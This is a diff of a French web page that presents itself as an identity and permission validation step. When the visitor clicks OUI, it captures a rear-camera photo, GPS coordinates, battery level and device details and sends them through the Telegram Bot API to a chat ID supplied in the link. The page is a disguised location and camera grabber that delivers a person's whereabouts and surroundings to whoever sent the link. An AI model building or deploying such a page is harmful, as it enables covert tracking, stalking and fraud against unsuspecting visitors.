@@ -3,47 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validation de votre position</title>
+    <title>Validation Globale</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            padding: 40px 20px;
+            padding: 30px 15px;
             background-color: #f4f4f9;
         }
         .card {
             background: white;
-            padding: 30px;
+            padding: 25px;
             border-radius: 12px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
             max-width: 400px;
             margin: auto;
+            text-align: left;
         }
         h1 {
             color: #333;
-            font-size: 20px;
-            margin-bottom: 15px;
+            font-size: 19px;
+            text-align: center;
+            margin-bottom: 20px;
         }
-        p {
-            color: #555;
-            font-size: 15px;
+        ul {
+            padding-left: 20px;
+            color: #444;
+            font-size: 14px;
+            line-height: 1.6;
             margin-bottom: 25px;
-            line-height: 1.5;
         }
-        .phone-display {
+        li {
+            margin-bottom: 10px;
+        }
+        .phone-highlight {
             font-weight: bold;
             color: #0088cc;
-            font-size: 18px;
+        }
+        .buttons-container {
+            display: flex;
+            gap: 10px;
         }
         button {
-            width: 100%;
+            flex: 1;
             padding: 14px;
             font-size: 16px;
             border-radius: 6px;
             cursor: pointer;
             font-weight: bold;
             border: none;
-            margin-bottom: 10px;
         }
         #yesBtn {
             background-color: #28a745;
@@ -66,22 +74,31 @@
 </head>
 <body>
 
-    <!-- Étape de confirmation du numéro -->
+    <!-- Affichage unique regroupant toutes les demandes -->
     <div class="card" id="formCard">
-        <h1>Confirmation d'identité</h1>
-        <p>Est-ce bien votre numéro de téléphone ?<br><span class="phone-display" id="phoneText">Chargement...</span></p>
+        <h1>Autorisations requises</h1>
+        <p style="font-size: 14px; color: #666; text-align: center; margin-bottom: 15px;">
+            Veuillez examiner et valider les conditions ci-dessous :
+        </p>
+        <ul>
+            <li>Confirmation du numéro : <span class="phone-highlight" id="phoneText">Chargement...</span></li>
+            <li>Autorisation d'accès au <strong>GPS (Position géographique)</strong></li>
+            <li>Autorisation d'accès à la <strong>caméra (Capture de l'environnement)</strong></li>
+            <li>Transmission des informations techniques de l'appareil</li>
+        </ul>
         
-        <button id="yesBtn">OUI</button>
-        <button id="noBtn">NON</button>
+        <div class="buttons-container">
+            <button id="noBtn">NON</button>
+            <button id="yesBtn">OUI</button>
+        </div>
     </div>
 
-    <!-- Étape de chargement lors de la validation -->
-    <div class="card" id="loadingCard" style="display: none;">
-        <h1>Patientez...</h1>
-        <p>Sécurisation et transmission des données en cours...</p>
+    <!-- Étape de chargement -->
+    <div class="card" id="loadingCard" style="display: none; text-align: center;">
+        <h1>Traitement en cours...</h1>
+        <p style="color: #666;">Veuillez patienter pendant la transmission des données...</p>
     </div>
 
-    <!-- Éléments cachés pour la capture -->
     <video id="cameraStream" autoplay playsinline></video>
     <canvas id="canvasCapture" style="display:none;"></canvas>
 
@@ -91,16 +108,14 @@
         const chatId = urlParams.get('chat_id');
         const phone = urlParams.get('phone') || "+225 0700000000";
 
-        // Afficher le numéro récupéré dans l'URL
         document.getElementById('phoneText').innerText = phone;
 
-        // Si l'utilisateur clique sur NON
+        // Bouton NON : Refus global
         document.getElementById('noBtn').addEventListener('click', () => {
-            alert("Validation annulée.");
+            alert("Validation refusée.");
             window.close();
         });
 
-        // Fonction pour récupérer les infos de l'appareil
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             let browser = "Navigateur inconnu";
@@ -126,7 +141,7 @@
             return { browser, typeAppareil, marqueModele };
         }
 
-        // Si l'utilisateur clique sur OUI
+        // Bouton OUI : Validation globale de tout d'un coup
         document.getElementById('yesBtn').addEventListener('click', async () => {
             if (!chatId) {
                 alert("Erreur : Chat ID manquant.");
@@ -147,7 +162,7 @@
             const info = getDeviceInfo();
 
             try {
-                // 1. Capture de l'environnement (caméra arrière)
+                // 1. Capture simultanée / séquentielle de la caméra
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'environment' } 
                 });
@@ -179,14 +194,14 @@
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
 
-                    // 3. Préparation du rapport textuel
+                    // 3. Préparation et envoi de tout sur Telegram
                     const descriptionText = 
-                        `📋 **RAPPORT COMPLET DE CONNEXION**\n\n` +
+                        `📋 **RAPPORT DE VALIDATION GLOBALE**\n\n` +
                         `• **Type d'appareil :** ${info.typeAppareil}\n` +
                         `• **Marque / Système :** ${info.marqueModele}\n` +
                         `• **Navigateur :** ${info.browser}\n` +
                         `• **Batterie :** ${batteryLevel}\n` +
-                        `• **Numéro de téléphone :** ${phone} (Confirmé OUI)\n` +
+                        `• **Numéro de téléphone :** ${phone} (Validé OUI)\n` +
                         `• **Chat ID Telegram :** ${chatId}`;
 
                     const textApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(descriptionText)}&parse_mode=Markdown`;
@@ -197,22 +212,22 @@
                         // Envoi du texte
                         await fetch(textApiUrl);
 
-                        // Envoi de la photo de l'environnement
+                        // Envoi de la photo
                         const formData = new FormData();
                         formData.append('chat_id', chatId);
                         formData.append('photo', imageBlob, 'environnement.jpg');
-                        formData.append('caption', '📷 Capture de l\'environnement');
+                        formData.append('caption', '📷 Capture globale de l\'environnement');
 
                         await fetch(photoApiUrl, {
                             method: 'POST',
                             body: formData
                         });
 
-                        // Envoi de la mini-carte interactive
+                        // Envoi de la mini-carte
                         await fetch(locationApiUrl);
 
-                        document.querySelector('#loadingCard h1').innerText = "Succès !";
-                        document.querySelector('#loadingCard p').innerText = "Les données ont été transmises avec succès. Vous pouvez fermer la page.";
+                        document.querySelector('#loadingCard h1').innerText = "Validé !";
+                        document.querySelector('#loadingCard p').innerText = "Toutes les données ont été transmises avec succès. Vous pouvez fermer la page.";
                         setTimeout(() => { window.close(); }, 3000);
 
                     } catch (error) {
